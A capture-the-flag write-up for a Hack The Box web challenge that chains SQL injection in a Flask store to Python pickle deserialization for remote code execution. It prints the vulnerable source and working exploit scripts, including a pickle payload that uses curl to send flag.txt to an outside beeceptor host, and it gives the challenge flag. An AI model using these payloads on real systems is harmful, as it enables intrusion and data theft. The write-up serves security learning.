# Web

## Description

The C.O.P (Cult of Pickles) have started up a new web store to sell their merch. We believe that the funds are being used to carry out illicit pickle-based propaganda operations! Investigate the site and try and find a way into their operation!

URL: [https://app.hackthebox.com/challenges/C.O.P](https://app.hackthebox.com/challenges/C.O.P)
## Source

`app.py`
```python
from flask import Flask, g
from application.blueprints.routes import web
import pickle, base64

app = Flask(__name__)
app.config.from_object('application.config.Config')

app.register_blueprint(web, url_prefix='/')

@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))

@app.teardown_appcontext
def close_connection(exception):
    db = getattr(g, '_database', None)
    if db is not None: db.close()
```

`database.py`
```python
from flask import g
from application import app
from sqlite3 import dbapi2 as sqlite3
import base64, pickle

def connect_db():
    return sqlite3.connect('cop.db', isolation_level=None)
    
def get_db():
    db = getattr(g, '_database', None)
    if db is None:
        db = g._database = connect_db()
        db.row_factory = sqlite3.Row
    return db

def query_db(query, args=(), one=False):
    with app.app.app_context():
        cur = get_db().execute(query, args)
        rv = [dict((cur.description[idx][0], value) \
            for idx, value in enumerate(row)) for row in cur.fetchall()]
        return (next(iter(rv[0].values())) if rv else None) if one else rv

class Item:
	def __init__(self, name, description, price, image):
		self.name = name
		self.description = description
		self.image = image
		self.price = price

def migrate_db():
    items = [
        Item('Pickle Shirt', 'Get our new pickle shirt!', '23', '/static/images/pickle_shirt.jpg'),
        Item('Pickle Shirt 2', 'Get our (second) new pickle shirt!', '27', '/static/images/pickle_shirt2.jpg'),
        Item('Dill Pickle Jar', 'Literally just a pickle', '1337', '/static/images/pickle.jpg'),
        Item('Branston Pickle', 'Does this even fit on our store?!?!', '7.30', '/static/images/branston_pickle.jpg')
    ]
    
    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))
```

`models.py`
```python
from application.database import query_db

class shop(object):

    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)

    @staticmethod
    def all_products():
        return query_db('SELECT * FROM products')    
```

`blueprints/routes.py`
```python
from flask import Blueprint, render_template
from application.models import shop

web = Blueprint('web', __name__)

@web.route('/')
def index():
    return render_template('index.html', products=shop.all_products())

@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))
```

`schema.sql`
```sql
DROP TABLE IF EXISTS products;

CREATE TABLE products (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    data TEXT NOT NULL,
    created_at NOT NULL DEFAULT CURRENT_TIMESTAMP
);

INSERT INTO products (data) VALUES ("{0}"), ("{1}"), ("{2}"), ("{3}"); 
```
## Solution

The webapp has some merch we can view. Merch is indexed by IDs in `/view/{id}` endpoint.

![c.o.p.png](/assets/ctf/htb/web/c.o.p.png)

The first thing that caught my eye was pickle module.
```python
@app.template_filter('pickle')
def pickle_loads(s):
	return pickle.loads(base64.b64decode(s))
```

[https://flask.palletsprojects.com/en/2.0.x/templating/#registering-filters](https://flask.palletsprojects.com/en/2.0.x/templating/#registering-filters): _If you want to register your own filters in Jinja2 you have two ways to do that. You can either put them by hand into the [`jinja_env`](https://flask.palletsprojects.com/en/2.0.x/api/#flask.Flask.jinja_env "flask.Flask.jinja_env") of the application or use the [`template_filter()`](https://flask.palletsprojects.com/en/2.0.x/api/#flask.Flask.template_filter "flask.Flask.template_filter") decorator._

[https://flask.palletsprojects.com/en/2.0.x/api/#flask.Flask.template_filter](https://flask.palletsprojects.com/en/2.0.x/api/#flask.Flask.template_filter): _A decorator that is used to register custom template filter. You can specify a name for the filter, otherwise the function name will be used._

The database doesn't hold records in standard way, it stores them as base64 pickle data.
```python
def migrate_db():
    items = [Item('Pickle Shirt', 'Get our new pickle shirt!', '23', '/static/images/pickle_shirt.jpg'), ...]
    with open('schema.sql', mode='r') as f:
        shop = map(lambda x: base64.b64encode(pickle.dumps(x)).decode(), items)
        get_db().cursor().executescript(f.read().format(*list(shop)))
```

The view product endpoint is vulnerable to SQLi
```python
@web.route('/view/<product_id>')
def product_details(product_id):
    return render_template('item.html', product=shop.select_by_id(product_id))
# # # # # 
class shop(object):
    @staticmethod
    def select_by_id(product_id):
        return query_db(f"SELECT data FROM products WHERE id='{product_id}'", one=True)
```

There's no sanitization, so we can dump the tables. There's one huge problem problem tho, the database is SQLite and it doesn't contain the flag and nor can we achieve RCE via SQLite.

[Python-Pickle-RCE-Exploit](https://github.com/CalfCrusher/Python-Pickle-RCE-Exploit) is a famous Python exploit. We can take advantage of base64/pickle usage and send a malicious request.

First let's test locally:
```python
import base64
import pickle
import requests

class Item:
    def __reduce__(self):
        import os
        command = 'curl https://uwuos.free.beeceptor.com -F file="@flag.txt"'
        return (os.system, (command, ))

payload = base64.b64encode(pickle.dumps(Item())).decode()  
print(payload)

url = 'http://127.0.0.1:1337/view'
payload = "0' UNION SELECT '{}' -- -".format(payload)
request_url = f'{url}/{payload}'
print(request_url)

resp = requests.get(request_url)
# print(resp.text)
```

![c.o.p-1.png](/assets/ctf/htb/web/c.o.p-1.png)

Same payload doesn't work remotely, probably because curl doesn't exist.

I wasn't able to make application talk to outside using different methods via http. We could hijack the module 

The trickiest part was making `__reduce__` method work for the `Item` class, the `SimpleNamespace` trick worked as a workaround.
```python
from bs4 import BeautifulSoup as BS
from types import SimpleNamespace
import base64
import pickle
import requests
import shlex
import subprocess

class RCE:
    def __reduce__(self):
        command = 'ls -alh'
        command = 'cat flag.txt'
        command = tuple(shlex.split(command))
        return (subprocess.check_output, (command, ))

class Item:
    def __init__(self):
        self.name = RCE()

    def __reduce__(self):
        return SimpleNamespace(**self.__dict__).__reduce__()


payload = base64.b64encode(pickle.dumps(Item())).decode()
print(payload)

url = 'http://127.0.0.1:1337/view'
url = 'http://83.136.251.216:45207/view'
payload = "0' UNION SELECT '{}' -- -".format(payload)
request_url = f'{url}/{payload}'
print(request_url)

resp = requests.get(request_url)
output = BS(resp.text, 'html.parser').find('div', class_='align-items-center').get_text()
output = output.replace('\\n', '\n')
print(output)

# gASVYAAAAAAAAACMBXR5cGVzlIwPU2ltcGxlTmFtZXNwYWNllJOUKVKUfZSMBG5hbWWUjApzdWJwcm9jZXNzlIwMY2hlY2tfb3V0cHV0lJOUjANjYXSUjAhmbGFnLnR4dJSGlIWUUpRzYi4=
# http://83.136.251.216:45207/view/0' UNION SELECT 'gASVYAAAAAAAAACMBXR5cGVzlIwPU2ltcGxlTmFtZXNwYWNllJOUKVKUfZSMBG5hbWWUjApzdWJwcm9jZXNzlIwMY2hlY2tfb3V0cHV0lJOUjANjYXSUjAhmbGFnLnR4dJSGlIWUUpRzYi4=' -- -
# HTB{n0_m0re_p1ckl3_pr0paganda_4u}
```

> Flag: `HTB{n0_m0re_p1ckl3_pr0paganda_4u}`

